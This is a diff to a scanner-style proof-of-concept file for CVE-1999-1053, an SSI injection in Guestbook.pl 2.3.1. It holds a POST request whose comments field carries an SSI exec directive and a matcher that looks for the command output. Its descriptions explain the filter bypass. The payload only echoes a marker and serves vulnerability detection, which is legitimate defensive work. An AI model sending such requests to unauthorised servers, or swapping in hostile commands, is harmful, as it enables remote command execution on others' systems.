@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "Matt Wright Guestbook.pl 2.3.1 SSI 注入漏洞验证。通过 POST 请求向 /cgi-bin/guestbook.pl 提交包含 SSI 指令的 comments 字段，利用 Apache 对 SSI 闭合序列的宽松解析绕过过滤，执行系统命令。"
+author = "ave"
+description = "guestbook.pl 仅通过移除 <!-- 与 --> 之间内容来过滤 SSI 指令，但 Apache 允许其他闭合序列（如 --!>），攻击者可构造绕过过滤的恶意 SSI 语句提交到留言板，在服务器端执行任意命令。本 PoC 通过提交包含 SSI 命令执行的留言并检测返回页面是否回显命令执行结果来判断漏洞存在。"
 id = "POC-AVE-1999-1686"
-name = "CVE-1999-1053 PoC"
+name = "CVE-1999-1053 Guestbook.pl SSI 远程命令执行 PoC"
 severity = "high"
 tags = ["ave-1999-1686"]
 vuln_id = [
@@ -15,15 +15,19 @@ logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/guestbook.pl"
+path = "/cgi-bin/guestbook.pl"
 protocol = "http"
 
 [poc.requests.body]
-content = "realname=test&username=test&url=http://example.com&city=test&state=test&comments=%3C%21--%23exec%20cmd%3D%22id%22--%3E"
+content = 'name=ave_test&email=test@test.com&comments=<!--#exec cmd="echo AVE_SSI_TEST_1234" -->&submit=Sign'
 type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["uid="]
+words = ["AVE_SSI_TEST_1234"]
